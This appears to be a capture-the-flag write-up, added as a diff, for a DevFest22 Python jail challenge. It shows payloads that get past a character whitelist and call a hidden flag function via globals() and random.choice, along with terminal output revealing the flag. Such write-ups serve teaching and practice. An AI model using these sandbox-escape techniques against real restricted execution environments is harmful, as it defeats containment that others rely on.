@@ -1,0 +1,46 @@
+$ python3 chall.py 
+You only get once chance: print(globals())
+{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f6bab21d450>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/home/sand_xcaper/python_sand/Devfest22/pyjail/challenge/chall.py', '__cached__': None, 'random': <module 'random' from '/usr/lib/python3.10/random.py'>, 'whitelist': 'abcdefghijklmnopqrstuvwxyz().=|', 'myflag': <function myflag at 0x7f6bab363d90>, 's': 'print(globals())'}
+
+random.random() is allowed and I think is the only function that we can assign a variable (We don't have numbers nor ' and ")
+we also don't have [] if allowed these could have been used to take directly the parameter in globals() or locals() where appears myflag()
+
+if we had "+" available this would be a payload...
+
+locals().get(str().join(dict(my=random.random()).keys())+str().join(dict(flag=random.random()).keys()))()
+
+'''
+In fact adding the "+" in the whitelist and running with our payload it gives us a flag:
+$ python3 chall.py 
+You only get once chance: locals().get(str().join(dict(my=random.random()).keys())+str().join(dict(flag=random.random()).keys()))()
+DevFest22{An0th3r_JAIL_g0t_brok333333n}
+'''
+
+a more easy solution if we could use , would be:
+
+locals().get(str().join(dict(my=random.random(),flag=random.random()).keys()))()
+
+
+but I think the real solution isn't too far from those...
+
+What we are looking for is a payload like this:
+locals().get("myflag")()
+
+So how can we bypass this name restriction? Because in the real challenge we don't have neither the + nor the , 
+
+What about seeking for some luck in random.choice() ?
+
+random.choice(list(globals().keys()))
+
+so our final payload would be something like this:
+
+globals().get(random.choice(list(globals().keys())))()
+
+Running multiple time we get:
+
+$ python3 chall.py 
+You only get once chance: globals().get(random.choice(list(globals().keys())))()
+DevFest22{An0th3r_JAIL_g0t_brok333333n}
+
+We escaped a really fun sandbox!!!
+
